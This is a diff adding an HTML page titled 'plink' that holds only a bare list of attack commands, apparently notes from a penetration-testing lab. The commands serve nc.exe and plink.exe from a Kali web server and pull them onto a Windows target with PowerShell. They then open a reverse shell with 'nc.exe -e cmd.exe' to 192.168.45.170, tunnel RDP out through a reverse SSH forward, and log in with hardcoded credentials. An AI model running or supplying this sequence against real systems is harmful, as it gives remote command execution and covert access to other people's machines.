@@ -1,0 +1,28 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>plink</title>
+</head><body>sudo systemctl start apache2<br/>
+<br/>
+find / -name nc.exe 2&gt;/dev/null<br/>
+<br/>
+sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/<br/>
+<br/>
+powershell wget -Uri http://192.168.45.170/nc.exe -OutFile C:\Windows\Temp\nc.exe<br/>
+<br/>
+nc -nvlp 4446<br/>
+<br/>
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.170 &nbsp;4446<br/>
+<br/>
+find / -name plink.exe 2&gt;/dev/null<br/>
+<br/>
+sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/<br/>
+<br/>
+powershell wget -Uri http://192.168.45.170/plink.exe -OutFile C:\Windows\Temp\plink.exe<br/>
+<br/>
+C:\Windows\Temp\plink1.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.170 <br/>
+<br/>
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833<br/>
+<br/>
+</body></html>
